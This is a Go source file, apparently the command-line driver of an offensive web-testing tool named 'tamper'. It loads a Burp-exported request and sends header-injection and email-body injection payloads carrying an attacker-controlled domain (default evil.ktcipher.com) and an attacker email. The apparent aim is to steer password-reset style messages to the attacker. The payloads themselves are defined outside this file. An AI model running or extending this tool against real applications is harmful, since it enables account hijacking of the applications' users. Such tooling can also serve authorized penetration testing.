package main

import (
	"flag"
	"fmt"
	"os"
)

func main() {
	requestFile := flag.String("r", "", "path to request file")
	attackerDomain := flag.String("d", "evil.ktcipher.com", "attacker domain for header injection and email construction (e.g. evil@domain)")
	attackerEmail := flag.String("e", "", "attacker email for body payload injection — required when using body mode (mode 2 or 3)")
	mode := flag.Int("mode", 3, "attack mode: 1=header only, 2=body only, 3=both")
	dry := flag.Bool("dry", false, "print payloads without sending")
	verbose := flag.Bool("v", false, "verbose — print full request before sending and full response after")

	flag.Parse()
	printBanner()

	if *requestFile == "" {
		fmt.Println(" usage: tamper -r request.txt [-d attacker.com] [-e evil@attacker.com] [--mode 1|2|3] [--dry] [-v]")
		fmt.Println()
		fmt.Println(" flags:")
		fmt.Println("   -r       path to Burp-exported request file (required)")
		fmt.Println("   -d       attacker domain for header injection (default: evil.ktcipher.com)")
		fmt.Println("   -e       attacker email for body payloads (required for mode 2 and 3)")
		fmt.Println("   --mode   1=header only, 2=body only, 3=both (default: 3)")
		fmt.Println("   --dry    preview payloads without sending")
		fmt.Println("   -v       verbose: show full request + full response")
		os.Exit(1)
	}

	req, err := ParseRequestFile(*requestFile)
	if err != nil {
		fmt.Println(" error:", err)
		os.Exit(1)
	}

	// Require -e when body payloads will be used
	if (*mode == 2 || *mode == 3) && *attackerEmail == "" {
		fmt.Println(" error: -e (attacker email) is required when using body mode (--mode 2 or 3)")
		fmt.Println("        example: tamper -r req.txt -e evil@attacker.com --mode 3")
		os.Exit(1)
	}

	fmt.Printf(" Target  : %s %s://%s%s\n", req.Method, req.Scheme, req.Host, req.Path)
	fmt.Printf(" Body    : %s\n", req.BodyType)
	fmt.Printf(" Fields  : %v\n", req.Fields)
	fmt.Printf(" Domain  : %s\n", *attackerDomain)
	if *attackerEmail != "" {
		fmt.Printf(" Email   : %s\n", *attackerEmail)
	}
	fmt.Println()

	filtered := filterPayloads(*mode)
	if len(filtered) == 0 {
		fmt.Println(" no payloads matched selected mode")
		os.Exit(1)
	}

	if *dry {
		fmt.Printf(" [dry run] %d payloads queued:\n\n", len(filtered))
		for i, p := range filtered {
			fmt.Printf("  %d. [%s] %s — %s\n", i+1, p.Mode, p.Name, p.Description)
		}
		return
	}

	RunInteractive(req, *attackerDomain, *attackerEmail, filtered, *verbose)
}

func filterPayloads(mode int) []Payload {
	var result []Payload
	for _, p := range Payloads {
		switch mode {
		case 1:
			if p.Mode == "header" {
				result = append(result, p)
			}
		case 2:
			if p.Mode == "body" {
				result = append(result, p)
			}
		case 3:
			result = append(result, p)
		}
	}
	return result
}
